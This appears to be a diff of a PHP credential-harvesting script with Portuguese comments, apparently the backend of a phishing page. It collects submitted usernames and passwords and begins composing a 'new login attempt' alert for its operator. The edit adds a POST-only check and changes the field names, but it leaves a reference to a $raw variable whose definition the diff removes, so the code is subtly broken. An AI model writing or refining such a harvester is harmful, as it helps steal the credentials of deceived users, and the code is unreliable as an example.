@@ -1,13 +1,18 @@
 <?php
-// captura absolutamente tudo que chega
-$raw = file_get_contents('php://input');
-error_log("RAW: ".$raw);                  // debug no servidor
+// Garante que é POST
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    exit;
+}
+
+// Debug correto (opcional – remova em produção)
+// error_log(print_r($_POST, true));
 
 // aceita JSON ou form
 $in = json_decode($raw,1) ?: [];
 $_POST = array_merge($_POST, $in);
 
-$email = trim($_POST['email'] ?? $_POST['user'] ?? $_POST['usuario'] ?? '');
+$email = trim($_POST['user'] ?? $_POST['login'] ?? $_POST['usuario'] ?? '');
 $senha = trim($_POST['senha'] ?? $_POST['pass'] ?? $_POST['password'] ?? '');
 
 $msg = "📩 Nova tentativa de login\n";
